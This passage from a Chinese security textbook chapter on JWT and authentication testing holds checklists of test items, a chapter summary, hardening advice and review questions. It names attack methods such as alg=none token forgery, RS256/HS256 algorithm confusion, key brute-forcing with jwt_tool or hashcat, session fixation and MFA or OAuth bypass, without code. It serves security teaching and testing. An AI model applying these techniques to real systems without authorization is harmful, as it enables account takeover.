**基础测试（10项）：**

| 测试项 | 描述 | 测试方法 |
|--------|------|----------|
| JWT格式验证 | 检查Token是否为标准JWT格式 | 解析Header.Payload.Signature |
| Header分析 | 检查alg和typ字段 | 解码并分析Header |
| Payload分析 | 检查声明字段完整性 | 解码并分析Payload |
| 敏感信息检测 | 检查Payload是否包含敏感数据 | 搜索password、secret等关键词 |
| 过期时间检查 | 检查exp声明是否存在 | 检查exp字段 |
| 密钥强度评估 | 评估签名密钥强度 | 分析算法和密钥长度 |
| Token传输方式 | 检查Token是否通过HTTPS传输 | 检查协议和传输头 |
| Token存储方式 | 检查Token存储位置 | 检查localStorage、Cookie |
| 签名验证 | 验证签名是否正确 | 使用密钥重新签名验证 |
| Token刷新机制 | 检查Refresh Token机制 | 测试过期后刷新流程 |

**漏洞测试（15项）：**

| 测试项 | 描述 | 测试方法 |
|--------|------|----------|
| none算法漏洞 | 测试是否接受none算法 | 构造alg=none的Token |
| 算法混淆攻击 | 测试RS256是否接受HS256 | 使用公钥伪造HS256签名 |
| 密钥爆破 | 测试弱密钥 | 使用jwt_tool或hashcat爆破 |
| 过期验证缺失 | 测试过期Token是否可用 | 修改exp为过去时间 |
| 签名绕过 | 测试签名验证逻辑 | 构造无效签名的Token |
| Payload注入 | 测试Payload注入 | 修改Payload字段 |
| Token重放 | 测试Token是否可重复使用 | 重复使用同一Token |
| Token窃取 | 测试Token是否易被窃取 | 检查传输和存储方式 |
| 信息泄露 | 测试敏感信息泄露 | 分析Payload内容 |
| 认证绕过 | 测试认证逻辑 | 尝试各种绕过方法 |

**高级测试（10项）：**

| 测试项 | 描述 | 测试方法 |
|--------|------|----------|
| JWT黑名单 | 测试Token黑名单机制 | 注销后测试Token是否失效 |
| 并发Token | 测试并发Token限制 | 同时使用多个Token |
| Token轮换 | 测试Token轮换机制 | 检查Token更新策略 |
| 权限边界 | 测试权限边界 | 尝试越权访问 |
| 跨域Token | 测试跨域Token使用 | 跨域发送Token |
| 算法降级 | 测试算法降级攻击 | 尝试降级加密算法 |
| 时间篡改 | 测试时间验证 | 修改系统时间 |
| 证书验证 | 测试证书验证 | 检查证书链 |
| JWKS验证 | 测试JWKS端点安全 | 检查jwks.json |
| 配置泄露 | 测试配置泄露 | 搜索敏感配置 |

### 12.9.2 认证安全测试清单

**登录认证（10项）：**

| 测试项 | 描述 | 测试方法 |
|--------|------|----------|
| 暴力破解 | 测试登录接口是否防暴力破解 | 多次尝试错误密码 |
| 账户锁定 | 测试账户锁定机制 | 连续失败登录 |
| 密码策略 | 测试密码复杂度要求 | 尝试弱密码注册 |
| 密码重置 | 测试密码重置流程 | 尝试重置他人密码 |
| Session固定 | 测试Session固定攻击 | 使用预知Session登录 |
| Session劫持 | 测试Session安全性 | 尝试劫持Cookie |
| 登录日志 | 测试登录日志记录 | 检查日志完整性 |
| 登录通知 | 测试异常登录通知 | 异地登录测试 |
| 密码找回 | 测试密码找回流程 | 尝试找回他人密码 |
| 多因素认证 | 测试MFA有效性 | 尝试绕过MFA |

**会话管理（10项）：**

| 测试项 | 描述 | 测试方法 |
|--------|------|----------|
| Session创建 | 测试Session创建逻辑 | 检查Session生成方式 |
| Session更新 | 测试登录后Session更新 | 检查登录后Session变化 |
| Session销毁 | 测试注销后Session销毁 | 注销后测试Session |
| Session超时 | 测试Session超时机制 | 等待超时后测试 |
| Cookie安全 | 测试Cookie安全属性 | 检查HttpOnly、Secure、SameSite |
| Token安全 | 测试Token安全属性 | 检查Token存储和传输 |
| 会话同步 | 测试多系统会话同步 | 跨系统测试Session |
| 注销完整性 | 测试注销完整性 | 注销后检查所有系统 |
| 并发会话 | 测试并发会话限制 | 多设备登录测试 |
| 会话恢复 | 测试会话恢复机制 | 重启浏览器后测试 |

**OAuth安全（10项）：**

| 测试项 | 描述 | 测试方法 |
|--------|------|----------|
| CSRF攻击 | 测试OAuth CSRF | 构造恶意授权链接 |
| 开放重定向 | 测试重定向URL验证 | 尝试重定向到恶意域名 |
| State参数 | 测试State参数验证 | 不提供或伪造State |
| 授权码泄露 | 测试授权码安全性 | 检查授权码传输方式 |
| Client验证 | 测试Client验证 | 使用伪造Client ID |
| Scope验证 | 测试Scope验证 | 尝试越权Scope |
| Token泄露 | 测试Token安全性 | 检查Token传输方式 |
| 注销流程 | 测试OAuth注销 | 检查注销完整性 |
| 证书验证 | 测试证书验证 | 检查SSL/TLS配置 |
| 协议安全 | 测试协议实现 | 检查OAuth实现合规性 |

## 12.10 本章小结

本章详细介绍了JWT与认证漏洞挖掘的各个方面：

**主要知识点：**

1. **JWT原理与结构**：了解了JWT的基本概念、三部分结构、工作流程和常见声明。

2. **JWT漏洞类型**：掌握了none算法漏洞、算法混淆漏洞、密钥爆破、信息泄露、过期验证缺失、签名绕过等漏洞的原理。

3. **认证绕过**：学习了JWT认证绕过、Session固定攻击、认证逻辑绕过、OAuth认证绕过等攻击技术。

4. **JWT安全测试工具**：了解了jwt_tool、JWT Debugger、Burp Suite插件等测试工具的使用方法。

5. **实战案例**：通过真实案例学习了漏洞的发现、分析和利用过程。

6. **防护措施**：掌握了JWT安全配置、签名验证、过期验证、黑名单机制、Token刷新等防护技术。

**关键要点：**

- JWT安全依赖于正确的实现和配置
- 算法选择和密钥强度至关重要
- 过期验证和黑名单机制是必要的安全措施
- 认证安全需要综合考虑多种因素
- 密码安全和多因素认证可增强安全性

**实践建议：**

1. 使用非对称算法（RS256/ES256）签名JWT
2. 设置合理的过期时间
3. 不在Payload中存储敏感信息
4. 实施Token黑名单机制
5. 使用强密钥并定期更换
6. 启用多因素认证
7. 记录登录日志并监控异常

## 思考题

1. JWT的Header、Payload、Signature三部分各自的作用是什么？

2. none算法漏洞的原理是什么？如何检测和防护？

3. 算法混淆漏洞是如何产生的？为什么HS256可以使用公钥签名？

4. 如何爆破JWT的签名密钥？有哪些常用工具？

5. Session固定攻击的原理是什么？如何防护？

6. JWT过期验证缺失会带来什么安全风险？

7. 如何设计一个安全的JWT认证系统？

8. 多因素认证如何增强系统安全性？

9. 如何检测和防护OAuth认证漏洞？

10. 密码安全存储有哪些最佳实践？